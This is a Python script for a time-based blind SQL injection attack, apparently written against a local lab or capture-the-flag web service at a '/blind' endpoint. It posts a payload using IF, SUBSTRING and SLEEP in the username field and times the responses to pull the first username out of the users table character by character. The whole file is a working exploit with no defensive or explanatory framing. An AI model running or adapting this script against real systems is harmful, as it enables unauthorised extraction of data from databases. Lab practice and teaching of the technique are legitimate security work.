import time
import httpx

# Settings
url = "http://host.docker.internal:5000/blind"
delay_threshold = 5  # Seconds to detect a time delay (greater than half of SQL SLEEP)
max_length = 30  # Max username length to try
charset = "abcdefghijklmnopqrstuvwxyz0123456789_{}.-"
extracted = ""

def test_char(position, char):
    payload = f"' OR IF(SUBSTRING((SELECT username FROM users LIMIT 1),{position},1)='{char}', SLEEP(10), 0) -- "
    try:
        start = time.time()
        response = httpx.post(url, data={"username": payload}, timeout=15)
        elapsed = time.time() - start
        return elapsed >= delay_threshold
    except httpx.ReadTimeout:
        return True

for pos in range(1, max_length + 1):
    found = False
    for c in charset:
        print(f"[*] Trying position {pos} with char '{c}'...", end="\r")
        if test_char(pos, c):
            extracted += c
            print(f"[+] Found char at position {pos}: {c}")
            found = True
            break
    if not found:
        print(f"[!] No more characters found at position {pos}. Stopping.")
        break

print(f"\n[RESULT] Extracted username: {extracted}")